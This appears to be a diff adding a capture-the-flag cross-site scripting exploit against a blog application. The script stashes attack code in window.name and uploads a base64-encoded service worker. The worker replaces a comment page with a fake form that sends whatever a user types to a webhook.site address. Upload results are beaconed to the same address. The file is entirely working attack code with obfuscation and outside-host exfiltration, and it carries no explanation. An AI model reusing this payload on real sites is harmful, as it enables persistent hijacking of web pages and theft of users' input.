@@ -1,0 +1,37 @@
+<script>
+    name = `const sendMessage = (msg) => {
+            navigator.sendBeacon('https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1', msg);
+        }
+
+        const upload = (formData, url) => {
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.text())
+                .then(result => {
+                    console.log('Success:', result);
+                    sendMessage(result)
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    sendMessage(error);
+                });
+        };
+
+        const getCsrfToken = async () => {
+            resp = await (await fetch("https://blogme.be.ax/profile")).text()
+            const parser = new DOMParser();
+            const htmlDocument = parser.parseFromString(resp, "text/html");
+            return htmlDocument.documentElement.querySelector("body > div:nth-child(4) > div.card-body > form").action;
+        }
+
+        getCsrfToken().then(url => {
+            const formData = new FormData();
+            const content = window.atob('c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIChlKSA9PiB7DQogICAgaWYgKGUucmVxdWVzdC5tZXRob2QgPT0gJ0dFVCcgJiYgZS5yZXF1ZXN0LnVybC5pbmNsdWRlcygnL2FwaS9jb21tZW50LycpKSB7DQogICAgICAgIGUucmVzcG9uZFdpdGgoDQogICAgICAgICAgICBuZXcgUmVzcG9uc2UoYDxodG1sPjxib2R5Pjx0ZXh0YXJlYSBuYW1lPSJ0ZXh0Ij48L3RleHRhcmVhPjxidXR0b24gY2xhc3M9J2J0biBidG4tcHJpbWFyeSBtdC0zIGZsb2F0LWVuZCcgdHlwZT0nc3VibWl0JyBvbmNsaWNrPSduYXZpZ2F0b3Iuc2VuZEJlYWNvbigiaHR0cHM6Ly93ZWJob29rLnNpdGUvYWUzZmU3M2YtMzU2Ni00YmJmLWFhNWUtNDM3ZjRkY2JhNGUxIiwgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigidGV4dGFyZWEiKS52YWx1ZSknPkNvbW1lbnQ8L2J1dHRvbj48L2JvZHk+PC9odG1sPmAsIHsNCiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgfSkNCiAgICAgICAgKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm47DQogICAgfQ0KfSk7DQo=');
+            const blob = new Blob([content], { type: "application/javascript" });
+            formData.append("file", blob);
+            upload(formData, url);
+        });`
+    location = "https://blogme.be.ax/post/3533b4ca-cd2d-4a44-9755-b585822edd88"
+</script>
